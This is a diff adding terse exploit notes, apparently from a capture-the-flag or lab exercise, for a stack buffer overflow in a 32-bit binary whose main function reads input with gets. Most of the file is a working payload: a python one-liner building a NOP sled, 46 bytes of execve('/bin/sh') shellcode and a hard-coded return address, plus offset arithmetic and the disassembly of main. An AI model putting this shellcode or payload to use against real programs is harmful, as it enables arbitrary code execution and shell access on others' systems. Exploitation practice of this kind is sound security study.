@@ -1,0 +1,30 @@
+0x804852c -- "Authentication failure.\nSorry."
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+`python -c 'print "A"*80+"\x90\x90\x90\x90"'`
+
+`python -c 'print "\x90"*30+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08
+\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x2e\xcf\xff\xff"'`
+Exploit format: 30*NOP + shellcode(46 bytes) + return_address(4 bytes)
+80-46 = 34
+
+Return Address: 0xffffcf2e
+
+# main func disas
+
+   0x08048414 <+0>:     push ebp
+   0x08048415 <+1>:     mov ebp,esp
+   0x08048417 <+3>:     and esp,0xfffffff0
+   0x0804841a <+6>:	sub    esp,0x60
+   0x0804841d <+9>:	mov    eax,0x8048520
+   0x08048422 <+14>:	mov    DWORD PTR [esp],eax
+   0x08048425 <+17>:	call   0x8048310 <printf@plt>
+   0x0804842a <+22>:	lea    eax,[esp+0x1d] 		( 0xffffcf0d )
+   0x0804842e <+26>:	mov    DWORD PTR [esp],eax
+   0x08048431 <+29>:	call   0x8048320 <gets@plt>
+   0x08048436 <+34>:	mov    DWORD PTR [esp],0x804852c
+   0x0804843d <+41>:	call   0x8048330 <puts@plt>
+   0x08048442 <+46>:	mov    eax,0x0
+   0x08048447 <+51>:	leave  
+   0x08048448 <+52>:	ret   
